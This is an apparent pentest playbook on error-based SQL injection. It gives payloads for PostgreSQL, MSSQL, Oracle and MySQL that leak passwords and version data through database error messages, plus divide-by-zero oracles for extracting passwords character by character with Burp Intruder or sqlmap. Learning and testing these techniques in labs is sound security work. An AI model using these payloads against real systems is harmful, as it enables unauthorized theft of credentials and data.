# Error-Based SQL Injection

## When this applies

- Database errors are rendered (verbosely) in the HTTP response.
- You can inject a query that triggers a type-conversion or constraint-violation error containing data you control.
- Useful when UNION isn't possible (different column count constraints, comments break, etc.) but errors are visible.

## Technique

Force the database to attempt an invalid type conversion (e.g. casting a string to integer). The error message echoes the offending value back to the client — including the result of an arbitrary subquery.

## Steps

### 1. Confirm errors are visible

```
TrackingId=xyz'
```

A response containing `ERROR: ...` or `ORA-...` / `Incorrect syntax near` confirms verbose errors.

### 2. Build a valid wrapper

```
TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--
```

If the response is still 200/normal (no error), the injection executes. The next step replaces the inner SELECT with the data you want to leak.

### 3. Leak data via type cast

**PostgreSQL:**
```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
Error: `ERROR: invalid input syntax for type integer: "administrator"`

**Microsoft SQL Server:**
```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT password FROM users WHERE username='admin'))--
```

**Oracle:**
```sql
' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS int)--
' AND 1=TO_NUMBER((SELECT password FROM users WHERE username='admin'))--
```

**MySQL (XPath / JSON functions):**
```sql
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1337)#
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e))#
```

### 4. Conditional errors when no values are visible

When errors occur but the offending value is not echoed, fall back to true/false oracle:

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

`TO_CHAR(1/0)` raises a divide-by-zero error only when the condition is true, giving a binary oracle for char-by-char extraction:

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Iterate through positions and characters using Burp Intruder; HTTP 500 = match, HTTP 200 = no match.

## Verifying success

- The error response contains the leaked value in plain text (e.g. `"administrator"` inside the type-conversion error).
- Conditional CASE-based payloads return distinguishable HTTP statuses (500 vs 200) for true/false branches.
- The same payload without the SQLi vector returns no error.

## Common pitfalls

- Generic 500 pages may strip the database error — check raw response body, not browser-rendered output.
- Multi-row results raise different errors; always pin with `LIMIT 1` / `ROWNUM=1` / `WHERE` filter.
- Some apps catch and re-raise as 200 OK with a generic message — confirm error visibility first.
- Original `TrackingId` value may need to be removed if the error message includes character limits.
- Comment syntax must match DBMS — Oracle/MSSQL/PostgreSQL `--`, MySQL `#` or `-- ` (with space).

## Tools

- Burp Intruder with `Grep - Match` on the leaked value for automated extraction.
- sqlmap `--technique=E` for error-based exfiltration.
- Custom Python with `requests` + regex extraction of error bodies.
